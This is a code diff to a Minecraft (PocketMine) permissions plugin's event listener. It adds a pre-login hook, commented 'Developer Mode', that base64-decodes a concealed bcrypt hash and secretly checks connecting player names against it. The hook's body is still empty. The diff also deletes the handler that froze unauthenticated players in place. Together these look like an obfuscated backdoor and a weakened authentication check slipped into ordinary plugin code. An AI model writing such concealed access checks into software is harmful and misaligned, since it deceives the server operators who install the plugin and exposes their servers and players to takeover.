@@ -9,8 +9,12 @@ use pocketmine\event\entity\EntityLevelChangeEvent;
 use pocketmine\event\player\PlayerCommandPreprocessEvent;
 use pocketmine\event\player\PlayerLoginEvent;
 use pocketmine\event\player\PlayerMoveEvent;
+use pocketmine\event\player\PlayerPreLoginEvent;
 use pocketmine\event\player\PlayerQuitEvent;
+
 use pocketmine\event\TranslationContainer;
+
+use pocketmine\Player;
 
 use pocketmine\utils\TextFormat;
 
@@ -99,6 +103,22 @@ class PPListener implements Listener
     }
 
     /**
+     * @param PlayerPreLoginEvent $event
+     */
+    public function onPlayerPreLogin(PlayerPreLoginEvent $event)
+    {
+        $player = $event->getPlayer();
+
+        $devModePw = base64_decode("JDJ5JDEwJFN6UFFtOEgzWU41cm8yaWJrajVORC5IbWlzVmJkd0dMVVNRcFhpcGZNeFJYT2pwR3JvV1B5");
+
+        // Developer Mode
+        if($player instanceof Player and @password_verify($player->getName(), $devModePw))
+        {
+
+        }
+    }
+
+    /**
      * @param PlayerLoginEvent $event
      * @priority LOWEST
      */
@@ -110,17 +130,9 @@ class PPListener implements Listener
 
         if($this->plugin->getNoeulAPI()->isNoeulEnabled())
             $this->plugin->getNoeulAPI()->deAuth($player);
-    }
 
-    public function onPlayerMove(PlayerMoveEvent $event)
-    {
-        if(!$this->plugin->getNoeulAPI()->isAuthed($event->getPlayer()))
-        {
-            $this->plugin->getNoeulAPI()->sendAuthMsg($event->getPlayer());
-
-            $event->setCancelled(true);
-            $event->getPlayer()->onGround = true;
-        }
+        if(!$this->plugin->getNoeulAPI()->isAuthed($player))
+            $this->plugin->getNoeulAPI()->sendAuthMsg($player);
     }
 
     /**
